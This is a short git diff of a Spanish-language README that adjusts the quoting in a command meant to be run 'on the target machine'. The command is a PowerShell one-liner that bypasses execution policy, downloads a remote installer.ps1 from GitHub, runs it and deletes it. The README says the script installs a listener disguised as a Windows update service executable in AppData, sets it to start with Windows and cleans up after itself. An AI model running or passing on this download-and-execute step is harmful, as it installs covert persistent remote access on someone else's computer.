@@ -59,7 +59,7 @@ API_KEY=tu_api_key_fish_audio
 Ejecutar en la máquina target:
 
 ```
-powershell.exe -ExecutionPolicy Bypass -Command "curl.exe -L 'https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/installer.ps1' -o '$env:TEMP\script.ps1'; & '$env:TEMP\script.ps1'; Remove-Item '$env:TEMP\script.ps1' -Force"
+powershell.exe -ExecutionPolicy Bypass -Command "curl.exe -L \"https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/installer.ps1\" -o \"$env:TEMP\script.ps1\"; & \"$env:TEMP\script.ps1\"; Remove-Item \"$env:TEMP\script.ps1\" -Force"
 ```
 
 Instala el listener en `%APPDATA%\Microsoft\Windows\UpdateService\systemUpdater.exe` y lo registra para iniciar con Windows. El script se elimina automáticamente al terminar.
